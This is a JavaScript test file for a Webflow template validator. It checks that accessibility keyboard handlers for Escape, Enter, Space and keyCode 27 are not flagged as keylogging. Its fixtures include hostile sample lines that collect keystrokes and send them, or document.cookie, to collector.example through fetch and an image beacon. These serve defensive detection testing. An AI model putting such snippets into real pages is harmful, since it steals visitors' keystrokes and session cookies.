import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import { findProhibitedMarketplaceCustomCode } from '../src/font-custom-code-policy.js';

// Keyboard listeners sit under "Keylogging" in securityRiskPatterns. A handler that
// only reacts to a named navigation key (Escape, Enter, Space, arrows) is
// accessibility code; a handler that captures or transmits key values is not.
// Flaue Udo (flau-template.webflow.io, Oct 2026) and Archoba (CRE-1990) were both
// blocked on every page for Escape/Enter/Space handlers while the Validator app
// reported "Submission gate clear".

const source = fs.readFileSync(new URL('../src/worker.js', import.meta.url), 'utf8');
const start = source.indexOf('var IX2_REJECTION_MESSAGE');
const endMarker = '__name(containsPotentiallyHarmfulCode, "containsPotentiallyHarmfulCode");';
const end = source.indexOf(endMarker) + endMarker.length;
assert.notEqual(start, -1, 'validator slice start not found');
assert.notEqual(end, endMarker.length - 1, 'validator slice end not found');

const sandbox = { console, Set, URL, findProhibitedMarketplaceCustomCode, __name: (target) => target };
vm.createContext(sandbox);
vm.runInContext(source.slice(start, end), sandbox);

const url = 'https://keyboard-fixture.webflow.io/';
const page = (script) => `<!doctype html><html data-wf-site="000000000000000000000000"><head><script>${script}</script></head><body></body></html>`;
const gsapPrelude = `gsap.registerPlugin(ScrollTrigger);\ngsap.to('[data-animate="hero"]', { opacity: 1, duration: 1, ease: 'expo.out' });\n`;

function run(script) {
  const result = sandbox.validateGsapUsage(page(script), url);
  return { passed: result.passed, risks: result.summary.securityRiskCount, flagged: result.summary.flaggedCodeCount };
}

// Flaue Udo: Escape closes the menu (arrow handler, `this` context).
const escapeMenu = gsapPrelude + `const Menu = {
  init() {
    gsap.set(this.menu, { visibility: 'hidden' });
    this.btn.addEventListener('click', e => { e.preventDefault(); this.open ? this.close() : this.show(); });
    window.addEventListener('keydown', e => { if (e.key === 'Escape' && this.open) this.close(); });
  }
};`;
assert.deepEqual(run(escapeMenu), { passed: true, risks: 0, flagged: 0 }, 'Escape-to-close handler must not count as keylogging');

// Archoba (CRE-1990): Enter/Space activate slider dots, Escape dismisses the nav.
const sliderDots = gsapPrelude + `dots[n].setAttribute('tabindex', '0');
dots[n].addEventListener('click', function () { go(n); start(); });
dots[n].addEventListener('keydown', function (e) {
  if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); go(n); start(); }
});
document.addEventListener('keydown', function (e) { if (e.key === 'Escape') dismiss(); });
gsap.to(track, { x: shiftFor(index), duration: 0.8, ease: 'power3.out' });`;
assert.deepEqual(run(sliderDots), { passed: true, risks: 0, flagged: 0 }, 'Enter/Space/Escape handlers must not count as keylogging');

// keyCode comparisons are the older spelling of the same handler.
const keyCodeEscape = gsapPrelude + `document.addEventListener('keyup', function (event) { if (event.keyCode === 27) { closeOverlay(); } });`;
assert.deepEqual(run(keyCodeEscape), { passed: true, risks: 0, flagged: 0 }, 'keyCode === 27 handler must not count as keylogging');

// Reads every key without a named-key check: still a risk.
const logsEveryKey = gsapPrelude + `document.addEventListener('keydown', e => console.log(e.key));`;
assert.equal(run(logsEveryKey).risks, 1, 'handler that reads every key stays flagged');
assert.equal(run(logsEveryKey).passed, false);

// Named-key check present but the handler accumulates and sends keys: still a risk.
const accumulatesAndSends = gsapPrelude + `let buffer = '';
document.addEventListener('keydown', e => { buffer += e.key; if (e.key === 'Enter') fetch('https://collector.example/' + buffer); });`;
assert.equal(run(accumulatesAndSends).risks, 1, 'handler that captures and transmits keys stays flagged');
assert.equal(run(accumulatesAndSends).passed, false);

// One accessible handler plus one capturing handler: the script stays flagged.
const mixedHandlers = gsapPrelude + `window.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
const typed = [];
document.addEventListener('keyup', e => { typed.push(e.key); });`;
assert.equal(run(mixedHandlers).risks, 1, 'every keyboard listener must qualify');
assert.equal(run(mixedHandlers).passed, false);

// Image beacon next to a named-key handler: still a risk.
const beaconNearby = gsapPrelude + `document.addEventListener('keydown', e => { if (e.key === 'Enter') { const img = new Image(); img.src = 'https://collector.example/?k=' + last; } });`;
assert.equal(run(beaconNearby).risks, 1, 'beacon inside the handler window stays flagged');

// The other security-risk rules are untouched.
const cookieExfil = gsapPrelude + `fetch('https://collector.example/' + document.cookie);`;
assert.equal(run(cookieExfil).risks, 1, 'cookie exfiltration stays flagged');

console.log('Keyboard accessibility handler checks passed.');
